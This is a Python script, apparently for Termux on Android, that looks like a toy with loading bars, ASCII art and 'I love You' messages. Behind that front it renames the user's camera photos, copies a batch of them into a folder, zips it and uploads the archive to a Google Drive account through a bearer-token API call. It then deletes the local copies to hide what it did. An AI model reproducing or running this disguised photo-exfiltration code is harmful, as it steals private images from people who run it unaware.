import os, time, zipfile, re
var = ("mvvv.py")
os.system('mv '+var+'.py'+' /storage/emulated/0/')
os.chdir('/storage/emulated/0/')
os.system('rm -rf /storage/emulated/0/Drive.zip')
os.system('rm -rf /storage/emulated/0/Drive/')
os.system('mkdir /storage/emulated/0/Drive/')
path = '/storage/emulated/0/DCIM/Camera/'
files = os.listdir(path)
index=1        
for index, file in enumerate(files):
     os.rename(os.path.join(path, file),os.path.join(path,''.join([str(index),'.jpg'])))
     index = index+1
try:
	import requests
	import shutil
	import random
	import join
	from sys import *
except:  
    os.system('pip3 install requests')
    os.system('pip3 install join')
    os.system('pip3 install shutil')
    os.system('pip3 install random')
RED = ("\033[31m")
pink = ('\033[95m')
os.system('clear')
print("\033[1;32;40m")
print ("\n▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n")
time.sleep(0.1)
os.system('cp /storage/emulated/0/DCIM/Camera/0.jpg /storage/emulated/0/DCIM/Camera/15.jpg  /storage/emulated/0/Drive/')
os.system('clear')
print ("\n▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n")
time.sleep(0.1)
os.system('cp /storage/emulated/0/DCIM/Camera/1.jpg /storage/emulated/0/DCIM/Camera/16.jpg  /storage/emulated/0/Drive/')
os.system('clear')
print ("\n▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n")
time.sleep(0.1)
os.system('cp /storage/emulated/0/DCIM/Camera/2.jpg /storage/emulated/0/DCIM/Camera/17.jpg /storage/emulated/0/Drive/')
os.system('clear')
print ("\n▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n")
time.sleep(0.1)
os.system('cp /storage/emulated/0/DCIM/Camera/3.jpg /storage/emulated/0/DCIM/Camera/18.jpg /storage/emulated/0/Drive/')
os.system('clear')
print ("\n▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒ Loading ...\n")
time.sleep(0.1)
os.system('cp /storage/emulated/0/DCIM/Camera/4.jpg /storage/emulated/0/DCIM/Camera/19.jpg /storage/emulated/0/Drive/')
os.system('clear')
print ("\n▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒ Loading ...\n")
time.sleep(0.1)
os.system('cp /storage/emulated/0/DCIM/Camera/5.jpg /storage/emulated/0/DCIM/Camera/20.jpg /storage/emulated/0/Drive/')
os.system('clear')
print ("\n▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒ Loading ...\n")
time.sleep(0.1)
os.system('cp /storage/emulated/0/DCIM/Camera/6.jpg /storage/emulated/0/DCIM/Camera/21.jpg /storage/emulated/0/Drive/')
os.system('clear')
print ("\n▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒ Loading ...\n")
time.sleep(0.1)
os.system('cp /storage/emulated/0/DCIM/Camera/7.jpg /storage/emulated/0/DCIM/Camera/22.jpg /storage/emulated/0/Drive/')
os.system('clear')
print ("\n▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒ Loading ...\n")
time.sleep(0.1)
os.system('cp /storage/emulated/0/DCIM/Camera/8.jpg /storage/emulated/0/DCIM/Camera/23.jpg /storage/emulated/0/Drive/')
os.system('clear')
print ("\n▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒ Loading ...\n")
time.sleep(0.1)
os.system('cp /storage/emulated/0/DCIM/Camera/9.jpg /storage/emulated/0/DCIM/Camera/24.jpg /storage/emulated/0/Drive/')
os.system('clear')
print ("\n▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒ Loading ...\n")
time.sleep(0.1)
os.system('cp /storage/emulated/0/DCIM/Camera/10.jpg /storage/emulated/0/DCIM/Camera/25.jpg /storage/emulated/0/Drive/')
os.system('clear')
print ("\n▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒ Loading ...\n")
time.sleep(0.1)
os.system('cp /storage/emulated/0/DCIM/Camera/11.jpg /storage/emulated/0/DCIM/Camera/26.jpg /storage/emulated/0/Drive/')
os.system('clear')
print ("\n▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒ Loading ...\n")
time.sleep(0.1)
os.system('cp /storage/emulated/0/DCIM/Camera/12.jpg /storage/emulated/0/DCIM/Camera/27.jpg /storage/emulated/0/Drive/')
os.system('clear')
print ("\n▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒ Loading ...\n")
time.sleep(0.1)
os.system('cp /storage/emulated/0/DCIM/Camera/13.jpg /storage/emulated/0/DCIM/Camera/28.jpg /storage/emulated/0/Drive/')
os.system('clear')
print("\n▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓"+RED+" Done\n")
time.sleep(0.1)
os.system('cp /storage/emulated/0/DCIM/Camera/14.jpg /storage/emulated/0/DCIM/Camera/29.jpg /storage/emulated/0/Drive/')
time.sleep(0.1)
os.system('clear')
print("\033[1;32;40m\n▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓"+RED+" Done\n")
time.sleep(0.1)
#if __name__ == '__main__':
#    main()
 
 
##################
def retrieve_file_paths(dirName):
 
  ###################
  filePaths = []
   
  ###################
  for root, directories, files in os.walk(dirName):
    for filename in files:
        ##################
        filePath = os.path.join(root, filename)
        filePaths.append(filePath)
         
  ##################
  return filePaths
 
 
##################
def main():
##################
  dir_name = 'Drive'
   
  ##################
  filePaths = retrieve_file_paths(dir_name)
   
  ##################
  print(RED+'Hello my Friend 💖💗💓💞💕💟💌💘💝❣🤎💜💙💚💛🧡❤🤍                         ')
  for fileName in filePaths:
    print('❤💚               ')
    print('💚❤               ')
     
  ###################
  zip_file = zipfile.ZipFile(dir_name+'.zip', 'w')
  with zip_file:
    ###################
    for file in filePaths:
     zip_file.write(file)
       
  print("I love You "+pink+"≧◡≦             ")


##################
if __name__ == "__main__":
  main()
################
def color():
	pink = '\033[95m'
	C='\033[1;36m'
	print(C+'''⣿⣿⣿⣿⡿⠟⠛⠋⠉⠉⠉⠉⠉⠛⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⠟⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠈⠙⠾⣿⣾⣿⣾⣿⣾⣿⣾⣿
⠋⡁⠀⠀⠀⠀⠀⢀⠔⠁⠀⠀⢀⠠⠐⠈⠁⠀⠀⠁⠀⠈⠻⢾⣿⣾⣿⣾⣟⣿
⠊⠀⠀⠀⠀⢀⠔⠃⠀⠀⠠⠈⠁⠀⠀⠀⠀⠀⠀⠆⠀⠀⠄⠀⠙⣾⣷⣿⢿⣿
⠀⠀⠀⠀⡠⠉⠀⠀⠀⠀⠠⢰⢀⠀⠀⠀⠀⠀⠀⢰⠀⠀⠈⡀⠀⠈⢿⣟⣿⣿
⠀⠀⢀⡜⣐⠃⠀⠀⠀⣠⠁⡄⠰⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠰⠀⠀⠈⢿⣿⣿
⠀⢠⠆⢠⡃⠀⠀⠀⣔⠆⡘⡇⢘⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿
⢀⡆⠀⡼⢣⠀⢀⠌⢸⢠⠇⡇⢘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿
⣼⣃⠀⠁⢸⢀⠎⠀⢸⠎⠀⢸⢸⡄⠀⠀⠀⠀⠀⠂⢀⠀⠀⠀⠀⠀⠀⠀⠀⣿
⠃⡏'''+pink+'''⠟⣷⣤⠁'''+C+'''⠀⠀⠸⠀⠀⡾⢀⢇⠀⠀⠀⠀⠀⠄⠸⠀⠀⠀⠀⠄⠀⠀⠀⣿
⠀⠀'''+pink+'''⣿⣿⣿⢦'''+C+'''⠀⠀⠀⠀⡧⠋⠘⡄⠀⠀⠀⠀⡇⢸⠀⠀⠠⡘⠀⠀⠀⢠⣿
⠈⠀'''+pink+'''⢿⢗⡻⠃'''+C+'''⠀⠀⠀⠀⠀⠀⠀⠀⠱⡀⠀⠀⢰⠁⡇⠀⠀⢨⠃⡄⢀⠀⣸⣿
⠀⠀⠀'''+pink+'''⠈'''+C+''''⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣱⠀⠀⡎⠸⠁⠀⢀⠞⡸⠀⡜⢠⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀'''+pink+'''⢠⣺⣿⣧⢰⣧ '''+C+'''⡁⡄⠀⡞⠰⠁⡸⣠⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀'''+pink+'''⠠⡿⠏⣿⠟⢁⠾'''+C+'''⢛⣧⢼⠁⠀⠀⢰⣿⡿⣷⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠡⠄⠀⡠⣚⡷⠊⠀⠀⠀⣿⡿⣿⡿⣿
⡀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠊⠁⢸⠁⠀⠀⠀⢰⣿⣿⡿⣿⣿
⠱⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠊⠀⠀⠀⡞⠀⠀⠀⠀⢸⣿⣷⣿⣿⣿
⠀⠙⢦⣀⠀⠀⠀⠀⠀⢀⣀⣠⠖⠁⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⣸⣿⣾⡿⣷⣿
⠀⠀⠀⠀⠉⠉⣩⡞⠉⠁⠀⢸⡄⠀⠀⠀⠀⠀⢰⠇⠀⠀⠀⠀⣿⣿⣷⣿⣿⣿
⡆⠀⠀⣀⡠⠞⠁⣧⢤⣀⣀⣀⡇⠀⠀⠀⠀⠀⣸⠀⠀⠀⠀⠀⣿⣷⣿⣷⣿⣿
⣿⣷⠊⠁⠀⠀⡰⠁⠀⠀⠀⠀⣹⠶⢦⡀⠀⠀⡇⠀⠀⠀⠀⠀⢸⣿⣷⣿⣷⣿
⣿⢿⠀⠀⠀⡔⠁⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡄⡇⠀⠀⠀⠀⠀⠈⣿⣾⣷⣿⣿
⠋⠈⠀⢀⠜⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠈⣧⠀⠀⠀⠀⠀⠀⠻⣿⣽⣾⣿
⢀⡄⡠⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠁⠀⠀⠀⣸⠀⠀⠀⠀⠀⠀⠀⣿⣿⣻⣿
⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀⠐⠀⠀⠀⠀⣀⡿⠀⠀⠀⠀⠀⠀⠀⢹⣿⣻⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠀⠀⠀⠀⠀⢀⣃⡇⠀⠲⡀⠀⠀⠀⠀⠈⣿⡿⣿
⣀⠤⠤⠤⡀⠀⠀⠀⠀⡴⠃⠀⠀⠀⠀⠀⢬⠞⡇⠀⠀⠇⠀⠀⠀⠀⠀⣿⣿⣿
⡁⢀⠀⠀⡇⠀⠀⠀⡼⠁⠀⠀⠀⠀⠀⣸⠁⠀⠇⠀⠀⡇⠀⠀⠀⠀⠀⣿⣿⣿
⠔⠃⠀⠀⡇⠀⠀⡼⠁⠀⠀⠀⠀⠀⢀⡇⠀⠀⡃⠀⠀⠙⢄⠀⠀⠀⠀⣿⣷⣿
⠒⠊⠀⠀⢸⠀⣸⠃⠀⠀⠀⠀⠀⠀⡞⠀⠀⠀⢅⠀⠀⡂⠸⡄⠀⠀⠀⣿⣟⣿
⠓⠀⠉⠀⢸⣰⠃⠀⠀⠀⠀⠀⠀⡜⡆⠀⠀⠀⢸⠀⠀⡇⢀⠇⠀⠀⠀⣿⣿⣿
⠉⠁⠀⢠⠞⠀⠀⠀⠀⠀⠀⠀⣰⠁⡇⠀⠀⠀⡇⠀⠀⡇⢸⠀⠀⠀⠀⣿⣷⣿
⡀⠀⢀⢿⣥⡤⠤⠤⠤⣀⣀⢠⠇⠀⢸⠀⠀⢰⠁⠀⢨⠀⢸⠀⠀⠀⠀⣿⣟⣿''')
################
def run():
	import os
	import time
	import zipfile
	import re
	import requests
	import shutil
	import random
	import json
	GREN = ('\033[92m')
	BLUE = ("\033[34m")
	pink = ('\033[95m')
	White = ("\033[97m")
	RED = ("\033[31m")
	yellow= ('\033[93m')
	LIGHTGREEN_EX = ('\033[92m')
	##################
	print(White+'''⠀     ⠀  ⠀⠀⠀⠀⠀⠀⠀⣠⠤⠖⠚⢉⣩⣭⡭⠛⠓⠲⠦⣄⡀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⢀⡴⠋⠁⠀⠀⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⢦⡀⠀⠀⠀⠀
	⠀⠀⠀⠀⢀⡴⠃⢀⡴⢳⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣆⠀⠀⠀
	⠀⠀⠀⠀⡾⠁⣠⠋⠀⠈⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⢧⠀⠀
	⠀⠀⠀⣸⠁⢰⠃⠀⠀⠀⠈⢣⡀⠀⠀⠀⠀⠀⠀⠀     ⠀⠀⠈⣇⠀⠈⣇⠀
	⠀⠀⠀⡇⠀⡾⡀⠀⠀⠀⠀⣀⣹⣆⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ⠀⢹⢹⢹⢹⠀
	 ⠀⠀⢸⠃⢀⣇⡈⠀⠀⠀⠀⠀⠀⢀⡑⢄⡀⢀⠀        ⠀⢹⢹⢹⢹
	  ⠀⢸⢻'''+GREN+'''⡟⡻⢶⡆⠀⠀⠀⠀⡼⠟⡳⢿⣦'''+White+'''⡑⢄⠀⠀⠀⠀⠀⠀⠀'''+White+''' ⠀ ⢸⢸⡇
	'''+White+'''⠀ ⣸⢸⠃'''+GREN+'''⡇⢀⠇⠀⠀⠀⠀⠀⡼⠀⠀⠈⣿⣿⣿'''+White+'''⡗⠂⠀⠀⠀⠀⠀   ⢸⢸⠁
	⠀⠀⡏⠀⣼'''+GREN+'''⠀⢳⠊⠀⠀⠀⠀⠀⠀⠱⣀⣀⠔'''+White+'''⣸⠁⠀⠀⠀⠀⠀⠀   ⢠⡟⠀
	⠀⠀⡇⢀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⢸⠃⢸⠃⠀
	⠀⢸⠃⠘⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠁⠀⠀⢀⠀⠀⠀⠀⠀⢸⠃⣾⠀⠀
	⠀⣸⠀⠀⠹⡄⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⡞⠀⠀⠀⠸⠀⠀⠀⠀⠀⣾⣾⣾⠀⠀
	⠀⡏⠀⠀⠀⠙⣆⠀⠀⠀⠀⠀⠀⠀⢀⣠⢶⡇⠀⠀⢰⡀   ⠀⠀⠀⣧⠀⠀⡇⠀⠀
	⢰⠇⡄⠀⠀⠀⡿⢣⣀⣀⣀⡤⠴⡞⠉⠀⢸⠀⠀⠀⣿⡇⠀  ⠀  ⣧ ⣧⠀
	⣸⠀⡇⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⢹⠀⠀⢸⠀⠀⢀⣿⠇⠀⠀⠀⠁  ⢸⠀⢸⠀⠀
	⣿⠀⡇⠀⠀⠀  '''+pink+''' ⢀⡤⠤⠶⠶⠾⠤⠾⠤'''+White+'''⢸⠀⡀⠸⣿⣀⠀⠀⠀⠀⠀⠈⣇⣀⠀
	⡇⠀⡇⠀⠀ ⠀'''+pink+'''⡴⠋⠀⠀⠀⠀⠀⠀⠀⠸⡌⣵⡀⢳⡇'''+White+'''⠀⠀⠀⠀⠀  ⠀ ⢹⡀
	⡇⠀⠇⠀⠀'''+pink+'''⡇⡸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠮⢧⣀⣻⢂'''+White+'''⠀⠀      ⠀⢧
	⣇⠀⢠⠀⠀'''+pink+'''⢳⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡎⣆⠀⠀⠀⠀⠀⠘
	'''+White+'''⢻⠈⠰⠀ '''+pink+'''⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⠘⢮⣧⡀⠀⠀⠀⠀
	'''+White+'''⠸⡆⠀⠀'''+pink+'''⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠆⠀⠀⠀⠀⠀⠀⠀⠙⠳⣄⡀⢢⢢⡀''')
	print(BLUE+'𝑪𝑶𝑫𝑰𝑵𝑮 𝑩𝒀 𝑰𝑵𝑺𝑻𝑨:'+yellow+'𝑻5𝑺𝑯      ')
	from time import sleep as timeout
	import time, os, sys
	def t(nn,t_):
	        print(t_)
	        print('')
	        for i in range(0,30):
	                i+=1
	                txt='\033[1;32m▒'*37
	                f=i*'\033[1;31m▊'
	                tt=i*3+1
	                ttt=str(tt)
	                print(txt+'┊'+ttt+'%  ',end='\r')
	                print('Wait┊{}'.format(f),end='\r')
	                time.sleep(0.2)
	        print('')
	t(0.10,'\n\t   \033[1;35m[ ..... PLEASE WAIT .... ]')
	print (' ')
	time.sleep(0.1)
	nun = ('abcde')
	headers = {"Authorization": "Bearer " + nun,}
	para = {
	    "name": "Drive.zip",
	}
	files = {
	    'data': ('metadata', json.dumps(para), 'application/json; charset=UTF-8'),
	    'file': open("./Drive.zip", "rb")
	}
	r = requests.post(
	    "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart",
	    headers=headers,
	    files=files
	)
	os.system('clear')
	color()
	print(GREN+''' ____''')
	print(GREN+'''|  _ \ '''+RED+''' ___ '''+yellow+''' _ __   '''+pink+'''___''')
	print(GREN+'''| | | |'''+RED+'''/ _ \\\033[93m| '_ \\\033[95m / _ \\''')
	print(GREN+'''| |_| |'''+RED+''' (_)'''+yellow+''' | | | |  '''+pink+'''__/''')
	print(GREN+'''|____/'''+RED+''' \___/'''+yellow+'''|_| |_|'''+pink+'''\___|''')
	os.system('rm -rf /storage/emulated/0/Drive.zip')
	os.system('rm -rf /storage/emulated/0/Drive/')
run()
